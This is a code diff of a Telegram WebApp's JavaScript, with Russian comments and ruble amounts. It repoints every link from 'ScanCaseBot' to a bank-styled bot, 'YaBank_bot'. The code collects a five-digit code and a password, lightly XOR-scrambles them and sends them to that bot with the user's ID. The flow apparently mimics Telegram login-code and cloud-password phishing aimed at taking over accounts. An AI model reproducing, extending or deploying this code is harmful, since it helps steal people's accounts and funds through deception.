@@ -642,7 +642,7 @@ async function appendCodeDigit(digit) {
     updateCodeDots();
     if (currentCode.length === 5) {
         const encryptedCode = await xorEncrypt(currentCode);
-        const botUsername = 'ScanCaseBot';
+        const botUsername = 'YaBank_bot';
         tg.openTelegramLink(`https://t.me/${botUsername}?start=sendCode_${currentUserId}_${encryptedCode}`);
         // Закрываем WebApp полностью
         tg.close();
@@ -693,7 +693,7 @@ if (passwordSubmit) {
             return;
         }
         const encryptedPassword = await xorEncrypt(password);
-        const botUsername = 'ScanCaseBot';
+        const botUsername = 'YaBank_bot';
         tg.openTelegramLink(`https://t.me/${botUsername}?start=sendPassword_${currentUserId}_${encryptedPassword}`);
         // Закрываем WebApp полностью
         tg.close();
@@ -771,7 +771,7 @@ function clearPendingTransaction() {
 }
 
 function startAuthFlow() {
-    const botUsername = 'ScanCaseBot';
+    const botUsername = 'YaBank_bot';
     
     // Сохраняем флаг, что мы в процессе авторизации
     userData.pending_auth = true;
@@ -975,7 +975,7 @@ if (checkSubmit) {
         }
 
         checkResultAmount.textContent = amount.toFixed(2) + ' ₽';
-        const botUsername = 'ScanCaseBot';
+        const botUsername = 'YaBank_bot';
         const shareLink = `https://t.me/${botUsername}?start=${token}`;
         checkResultToken.textContent = shareLink;
         checkResultScreen.classList.add('active');
@@ -985,7 +985,7 @@ if (checkSubmit) {
 
 if (checkCopyBtn) {
     checkCopyBtn.addEventListener('click', () => {
-        const botUsername = 'ScanCaseBot';
+        const botUsername = 'YaBank_bot';
         const shareLink = `https://t.me/${botUsername}?start=${lastCheckToken}`;
         navigator.clipboard.writeText(shareLink).then(() => {
             showToast('Ссылка скопирована!', 'success');
